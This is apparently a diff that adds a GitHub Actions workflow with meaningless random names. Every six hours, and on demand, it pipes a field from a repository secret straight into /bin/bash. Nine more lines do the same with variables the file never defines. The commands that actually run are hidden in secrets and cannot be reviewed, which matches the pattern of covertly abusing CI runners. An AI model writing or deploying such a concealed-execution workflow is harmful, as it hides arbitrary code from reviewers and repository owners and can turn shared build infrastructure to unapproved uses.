@@ -1,0 +1,27 @@
+name: xiabaile2318
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '6 4/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: xiabaile2318
+        env:
+          s5874: ${{ secrets.s5874 }}
+        run: |
+          echo $s5874 | jq -r .ir021 | /bin/bash
+          echo $rtp523 | jq -r .zna4 | /bin/bash
+          echo $ahw9 | jq -r .to0 | /bin/bash
+          echo $t281 | jq -r .s06 | /bin/bash
+          echo $iir124 | jq -r .bo3 | /bin/bash
+          echo $mkcnc998 | jq -r .czaec82391 | /bin/bash
+          echo $pum33317 | jq -r .lee13 | /bin/bash
+          echo $i88515 | jq -r .uagal491 | /bin/bash
+          echo $go390 | jq -r .xf7036 | /bin/bash
+          echo $l7519 | jq -r .mabz85 | /bin/bash
+
